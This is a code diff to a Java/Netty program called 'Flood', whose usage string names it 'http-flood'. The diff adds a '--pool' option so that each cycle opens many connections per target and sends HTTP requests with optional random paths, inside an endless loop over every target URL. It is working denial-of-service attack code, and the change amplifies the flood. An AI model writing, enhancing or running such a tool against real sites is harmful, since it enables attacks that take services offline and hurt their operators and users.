@@ -39,9 +39,11 @@ public class Flood {
     private static final char[] ALPHABET = "abcdefghijklmnopqrstuvwxyz".toCharArray();
     private static final int ALPHABET_LENGTH = ALPHABET.length;
     private static final Random R = new Random();
+    private final int num;
 
-    public Flood(String target, boolean randomPath) throws KeyManagementException, URISyntaxException {
+    public Flood(String target, boolean randomPath, int num) throws KeyManagementException, URISyntaxException {
         this.randomPath = randomPath;
+        this.num = num;
         URI uri = new URI(target);
         host = uri.getHost();
         boolean isHttps = "https".equals(uri.getScheme());
@@ -85,16 +87,18 @@ public class Flood {
         if (randomPath) {
             request.setUri(getRandomPath());
         }
-        ChannelFuture f = b.connect(host, port);
-        f.addListener((future) -> {
-            if (future.isSuccess()) {
-                f.channel()
-                        .write(request);
-                f.channel()
-                        .flush()
-                        .closeFuture();
-            }
-        });
+        for (int i = 0; i < num; i++) {
+            ChannelFuture cf = b.connect(host, port);
+            cf.addListener((future) -> {
+                if (future.isSuccess()) {
+                    cf.channel()
+                            .write(request);
+                    cf.channel()
+                            .flush()
+                            .closeFuture();
+                }
+            });
+        }
     }
 
     private class Handler extends ChannelInboundHandlerAdapter {
@@ -126,7 +130,7 @@ public class Flood {
 
     public static void main(String[] args) throws KeyManagementException, URISyntaxException {
         if (args.length < 1) {
-            System.err.println("Usage: http-flood [-r|--random-path] URL [URL...]");
+            System.err.println("Usage: http-flood [-r|--random-path] [--pool={num}] URL [URL...]");
             System.exit(1);
         }
         ArrayList<String> options = new ArrayList<>();
@@ -141,15 +145,25 @@ public class Flood {
         boolean randomPath = options.stream().anyMatch((String option) -> {
             return Arrays.asList("-r", "--random-path").contains(option);
         });
+        int num = options.stream().filter((String option) -> {
+            return option.startsWith("--pool=");
+        }).map((String option) -> {
+            System.out.println(option);
+            return Integer.parseInt(option.split("=", 2)[1]);
+        }).findFirst().orElse(1);
+        System.out.println("Channels per thread: " + String.valueOf(num));
         ArrayList<Flood> floods = new ArrayList<>();
         for (String target : targets) {
-            floods.add(new Flood(target, randomPath));
+            floods.add(new Flood(target, randomPath, num));
         }
         while (true) {
             floods.forEach((Flood flood) -> {
                 flood.go();
             });
         }
+        //floods.forEach((Flood flood) -> {
+        //    flood.terminate();
+        //});
     }
 
 }
